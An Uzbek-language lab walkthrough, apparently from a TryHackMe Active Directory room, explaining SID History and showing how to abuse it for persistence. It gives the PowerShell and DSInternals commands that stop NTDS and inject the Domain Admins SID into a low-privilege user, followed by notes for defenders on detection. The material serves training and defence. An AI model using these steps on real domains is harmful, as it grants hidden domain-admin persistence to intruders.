### SIDlar va SID Tarixi haqida

**Security Identifier (SID)** — bu har bir foydalanuvchi, guruh yoki boshqa xavfsizlik obyektining noyob identifikatoridir. SID tizim orqali foydalanuvchining huquqlarini kuzatib borish uchun ishlatiladi. Ammo SID'lar bilan birga, **SID tarixi (SID History)** deb ataladigan juda qiziqarli atribut ham mavjud.

---

### SID Tarixi nima va u qanday ishlaydi?

SID tarixi aslida Active Directory migratsiyasi vaqtida foydalanuvchilarning eski resurslarga kirishini ta'minlash uchun ishlatiladi. Yangi domenga o‘tilganda, foydalanuvchiga yangi SID beriladi, lekin eski SID ularning SID tarixi atributiga qo‘shilsa, foydalanuvchi hali ham eski domen resurslariga kira oladi.

Bu esa migratsiya jarayonini silliq qiladi. **Lekin** biz — hujumchilar sifatida, bu imkoniyatdan **doimiylik (persistence)** usuli sifatida foydalanishimiz mumkin.

---

### Tarixni Soxtalashtirish – Abusing SID History

Aslida, SID tarixiga faqat boshqa domenlardan SID qo‘shish talab qilinmaydi. Agar sizda yetarlicha huquq bo‘lsa (odatda **Domain Admin** darajasidagi), o‘z domeningizdagi har qanday SID'ni foydalanuvchining SID tarixi ichiga qo‘shishingiz mumkin.

**Muhim jihatlar:**

* Bunday hujum uchun odatda **Domain Admin** darajasidagi ruxsatlar kerak bo‘ladi.
* SID tarixi orqali qo‘shilgan SID foydalanuvchi kirgan vaqtda uning tokeniga kiritiladi, shuningdek guruh SID'lari ham.
* Agar siz SID tarixi ichiga **Enterprise Admin** SID'ni qo‘shsangiz, bu butun forest bo‘yicha kuchli huquqlarga ega bo‘ladi.
* Foydalanuvchi **Domain Users** guruhida bo‘lsa ham, SID tarixi orqali **Domain Admin** huquqlarini oladi — juda yashirin va xavfli usul.
* Buni yanada yashirin qilish uchun boshqa foydalanuvchi SID tarixini tahrir qilishda ishlatilishi mumkin — shunda asosiy foydalanuvchi o‘zgarishlarda ko‘rinmaydi.

---

### SID Tarixini Soxtalashtirish (Amaliyot)

1. **THMDC** serveriga **Administrator** hisobidan SSH orqali ulanamiz.
2. SID tarixini ko‘rish uchun quyidagilarni bajaramiz:

```powershell
Get-ADUser <foydalanuvchi_nomi> -properties sidhistory,memberof
```

Agar quyidagidek chiqsa:

```text
SIDHistory: {}
```

Demak, hozirda hech qanday SID tarixi mavjud emas.

3. Endi **Domain Admins** guruhining SID'ni topamiz:

```powershell
Get-ADGroup "Domain Admins"
```

Va u quyidagicha ko‘rinadi:

```text
SID: S-1-5-21-3885271727-2693558621-2658995185-512
```

---

### DSInternals bilan SID Tarixini O‘zgartirish

Mimikatz hozirgi kunda LSASS’ni kerakli tarzda patch qila olmaydi, shuning uchun **DSInternals** vositasidan foydalanamiz.

1. **NTDS** xizmatini to‘xtatamiz:

```powershell
Stop-Service -Name ntds -force
```

2. SID tarixini qo‘shamiz:

```powershell
Add-ADDBSidHistory -SamAccountName 'aaron.jones' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath C:\Windows\NTDS\ntds.dit
```

3. NTDS xizmatini qayta ishga tushiramiz:

```powershell
Start-Service -Name ntds
```

---

### Tekshirish: DA Huquqlari Olindi

Endi **THMWRK1** mashinasiga past huquqli foydalanuvchi orqali SSH bilan ulanib tekshiramiz:

```powershell
Get-ADUser aaron.jones -Properties sidhistory
```

Chiqarilgan ma’lumotlar orasida quyidagisi bo‘lsa:

```text
SIDHistory : {S-1-5-21-3885271727-2693558621-2658995185-512}
```

Bu — Domain Admins SID — demak foydalanuvchi bu guruhga a’zo bo‘lmasa ham, token orqali huquqlarni olgan.

Endi masalan, `\\thmdc.za.tryhackme.loc\c$` ga kira olsa, demak u to‘liq DA huquqlariga ega:

```powershell
dir \\thmdc.za.tryhackme.loc\c$
```

---

### Blue Team uchun ogohlantirish

Agar siz **Active Directory Users and Computers** konsolini ochsangiz ham, bu SID tarixi atributi ko‘rinadi. Ammo:

* Uni oddiy GUI orqali olib tashlab bo‘lmaydi.
* SID tarixi **protected** atribut bo‘lib, **PowerShell RSAT** cmdlet'lari orqali o‘chirib tashlanadi.
* Bundan ham yomoni, foydalanuvchi **Domain Admins** guruhiga a’zo bo‘lmaydi — shuning uchun ko‘zga tashlanmaydi.
* SID tarixi faqat autentifikatsiya vaqtida tokenga qo‘shiladi — bu esa bu hujumni **aniqlashni juda qiyinlashtiradi**.

---

### Real Voqea Tasavvuri

Aytaylik, siz Blue Team bo‘lib, domenni tikladingiz: KRBTGT parollarini almashtirdingiz, Golden/Silver ticketlarni yo‘q qildingiz, hatto yangi CA server qurdingiz. Ammo hanuz past huquqli hisob orqali DA amallar bajarilmoqda.

Bu siz uchun **yaxshi kun emas**.
